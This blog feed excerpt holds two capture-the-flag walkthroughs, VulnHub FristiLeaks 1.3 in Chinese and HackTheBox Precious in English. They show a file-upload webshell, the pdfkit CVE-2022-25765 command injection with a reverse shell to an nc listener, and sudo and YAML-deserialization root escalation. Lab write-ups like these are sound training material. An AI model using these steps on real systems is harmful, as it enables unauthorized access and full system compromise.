    <url>/2023/04/26/vulnhub-FristiLeaks-1-3/</url>
    
    <content type="html"><![CDATA[<h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><p>arp-scan获取目标ip 192.168.59.18：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307205944349.png" alt="image-20230307205944349"></p><p>masscan全端口扫描:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212119043.png" alt="image-20230307212119043"></p><p>nmap对开放端口进行服务探测：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212152487.png" alt="image-20230307212152487"></p><p>whatweb：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212239788.png" alt="image-20230307212239788"></p><p>dirsearch目录爆破：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307212417837.png" alt="image-20230307212417837"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213101589.png" alt="image-20230307213101589"></p><p>综上，只开放了一个80端口，开启了apache服务，apache2.2.15+php5.3.3，linux操作系统，后台目录有&#x2F;cola,&#x2F;robots.txt,&#x2F;images,&#x2F;sisi,&#x2F;beer.</p><p>先访问web界面：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213538737.png" alt="image-20230307213538737"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213600829.png" alt="image-20230307213600829"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213610628.png" alt="image-20230307213610628"></p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213726384.png" alt="image-20230307213726384"></p><p>均无有效信息。</p><p>接下来尝试寻找php+apache漏洞。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213811701.png" alt="image-20230307213811701"></p><p>前两个版本均符合，尝试利用。</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213906097.png" alt="image-20230307213906097"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307213932426.png" alt="image-20230307213932426"></p><p>404.无cgi页面。</p><p>第二个脚本利用结果同样如此：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214017727.png" alt="image-20230307214017727"></p><p>404 not found.</p><p>继续从web页面寻找突破，根据首页的图片，尝试访问&#x2F;fristi:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214232322.png" alt="image-20230307214232322"></p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214806121.png" alt="image-20230307214806121"></p><p>经过简单的手注之后，无果，直接sqlmap：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214431409.png" alt="image-20230307214431409"></p><p>不存在sql注入。</p><p>爆破弱口令同样失败。</p><p>查看源代码，发现提示：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214859613.png" alt="image-20230307214859613"></p><p>作者名为eezeepz，并且使用了base64加密图片，往下飞发现base64密文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307214950977.png" alt="image-20230307214950977"></p><p>base64解密，发现文件头PNG：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215107490.png" alt="image-20230307215107490"></p><p>保存为png查看：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215246674.png" alt="image-20230307215246674"></p><p>发现一串密码，keKkeKKeKKeKkEkkEk，登录：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215418880.png" alt="image-20230307215418880"></p><p>登录成功，来到文件上传页面。</p><p>上传正常jpg文件，成功：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215630815.png" alt="image-20230307215630815"></p><p>访问&#x2F;uploads&#x2F;conan.jpg:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307215658986.png" alt="image-20230307215658986"></p><p>正常。</p><p>写马，改后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220022189.png" alt="image-20230307220022189"></p><p>失败，校验了后缀名，只能为png,jpg,gif。</p><p>考虑到apache版本为2.2.15，存在多后缀解析漏洞，直接加后缀：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220110652.png" alt="image-20230307220110652"></p><p>成功，蚁剑连接：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220139843.png" alt="image-20230307220139843"></p><p>为低权限，apache，home目录下有3个用户，admin,eezeepz,fristigod:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220407606.png" alt="image-20230307220407606"></p><p>除了eezeepz目录，都没有权限访问，在eezeepz目录下发现notes.txt:</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307220524600.png" alt="image-20230307220524600"></p><p>可以发现如下信息：</p><p>作者jerry，即为&#x2F;home&#x2F;admin，该目录下有chmod,df,cat,echo,ps,grep,egrep等命令可以使用，在&#x2F;tmp&#x2F;目录下新建一个runthis文件，该文件里的内容会以admin的权限每分钟运行一次，结果保存在&#x2F;tmp&#x2F;cronresult中。</p><p>首先想到的是chmod命令，改变&#x2F;home&#x2F;admin权限：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221710113.png" alt="image-20230307221710113"></p><p>此时已经能够访问&#x2F;admin目录。</p><p>查看文件内容：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307221828145.png" alt="image-20230307221828145"></p><p>从命名看出，cryptedpass.txt为加密后的密文，而cryptpass.py为加密脚本。</p><p>编写解密函数：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222312005.png" alt="image-20230307222312005"></p><p>解密得到明文：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222356135.png" alt="image-20230307222356135"></p><p>可能是某个用户的密码，尝试su：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222439699.png" alt="image-20230307222439699"></p><p>先tty：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222639878.png" alt="image-20230307222639878"></p><p>蚁剑的虚拟终端无法成功，先传shell到kali，再用python：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307222841090.png" alt="image-20230307222841090"></p><p>成功拿到fristigod权限。</p><p>sudo -l：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223028627.png" alt="image-20230307223028627"></p><p>提示可以使用该 “doCom” 执行任何命令。</p><p>访问文件：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223554288.png" alt="image-20230307223554288"></p><p>为二进制文件。</p><p>有提示.&#x2F;program_name terminal_command.</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223705185.png" alt="image-20230307223705185"></p><p>来到同级目录，查看history文件，用法为sudo -u fristi &#x2F;var&#x2F;fristigod&#x2F;.secret_admin_stuff&#x2F;doCom &lt;command&gt;</p><p>因此直接起新的终端：</p><p><img src="/2023/04/27/file-upload/tiLeaks-1-3/image-20230307223841372.png" alt="image-20230307223841372"></p><p>拿到root权限，获取flag。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_precious</title>
    <link href="/2023/04/26/htb-precious/"/>
    <url>/2023/04/26/htb-precious/</url>
    
    <content type="html"><![CDATA[<h1 id="precious"><a href="#precious" class="headerlink" title="precious"></a>precious</h1><h2 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h2><p>use nmap to discover open-ports and services:</p><p><img src="/2023/04/27/file-upload/image-20230426093453128.png" alt="image-20230426093453128"></p><p>Now we focus on its http service on <strong>port 80</strong>.</p><p>Access it by firefox browser(remember to modify your &#x2F;etc&#x2F;hosts):</p><p><img src="/2023/04/27/file-upload/image-20230426093615323.png" alt="image-20230426093615323"></p><p>It seems that this website would help us convert web page to a pdf file. I tried <code>aaa</code> in the search bar:</p><p><img src="/2023/04/27/file-upload/image-20230426093935361.png" alt="image-20230426093935361"></p><p>I was reminded to provide a valid url. Naturally i think of starting a http-server on my kali and then entering my server address :</p><p><img src="/2023/04/27/file-upload/image-20230426094213706.png" alt="image-20230426094213706"></p><p>As excepted, a pdf was downloaded to my own machine. We can obviously find some familiar files by clicking it.</p><p>At this time all i can access is a <strong>pdf</strong> , as a result i use <code>exiftool</code> to analyse it.</p><p><img src="/2023/04/27/file-upload/image-20230426094838824.png" alt="image-20230426094838824"></p><p>What inspires me is <code>pdfkit v0.8.6</code>. I tried <code>searchsploit</code> subconsciously but found nothing:</p><p><img src="/2023/04/27/file-upload/image-20230426095134399.png" alt="image-20230426095134399"></p><p>Then i turned to google , finding a command injection vulnerability:</p><p><img src="/2023/04/27/file-upload/image-20230426095404721.png" alt="image-20230426095404721"></p><p>After trying several pocs, i found a python exp[<a href="https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765">nikn0laty&#x2F;PDFkit-CMD-Injection-CVE-2022-25765: Exploit for CVE-2022-25765 command injection in pdfkit &lt; 0.8.6 (github.com)</a>]:</p><p>step 1:</p><p>starting a python simple http-server:</p><p><img src="/2023/04/27/file-upload/image-20230426095817647.png" alt="image-20230426095817647"></p><p>step 2:</p><p>nc:</p><p><img src="/2023/04/27/file-upload/image-20230426095839251.png" alt="image-20230426095839251"></p><p>step 3:</p><p>python CVE-2022-25765.py -t target -a localhost -p localport:</p><p><img src="/2023/04/27/file-upload/image-20230426100735748.png" alt="image-20230426100735748"></p><h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>now we got a shell after exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426100950158.png" alt="image-20230426100950158"></p><p>By following below steps , i finally access a fully interactive shell:</p><ol><li>open a bash terminal</li><li>nc -nlvp 4444</li><li>ctrl+z to background the job</li><li>stty -echo raw</li><li>fg</li></ol><p><img src="/2023/04/27/file-upload/image-20230426101437784.png" alt="image-20230426101437784"></p><p>I found a secret directory in home path after looking around:</p><p><img src="/2023/04/27/file-upload/image-20230426101649976.png" alt="image-20230426101649976"></p><p><code>su henry</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426101922560.png" alt="image-20230426101922560"></p><p><code>user.txt</code> lies in <code>/home/henry</code> .</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>The last step is privilege escalation.</p><p>At first , i tried the most simple but effective way:</p><p><img src="/2023/04/27/file-upload/image-20230426102257184.png" alt="image-20230426102257184"></p><p>It appears that henry can run the file update_depencies.rb as root. Use cat to take a look at the file:</p><p><img src="/2023/04/27/file-upload/image-20230426102404182.png" alt="image-20230426102404182"></p><p>I’m stuck with <code>YAML.load</code> , it appears to be vulnerable to a deserialization attack. </p><p>Notice that the rb load a file named <strong>dependencies.yml</strong>. I download malicious yml from google to vefity the vul.</p><p><img src="/2023/04/27/file-upload/image-20230426102947150.png" alt="image-20230426102947150"></p><p><code>sudo /usr/bin/ruby /opt/update_dependencies.rb</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103016168.png" alt="image-20230426103016168"></p><p>It works!</p><p>Try to add suid to &#x2F;bin&#x2F;bash:</p><p><img src="/2023/04/27/file-upload/image-20230426103128047.png" alt="image-20230426103128047"></p><p>exploit:</p><p><img src="/2023/04/27/file-upload/image-20230426103144435.png" alt="image-20230426103144435"></p><p><code>/bin/bash -p</code>:</p><p><img src="/2023/04/27/file-upload/image-20230426103206671.png" alt="image-20230426103206671"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
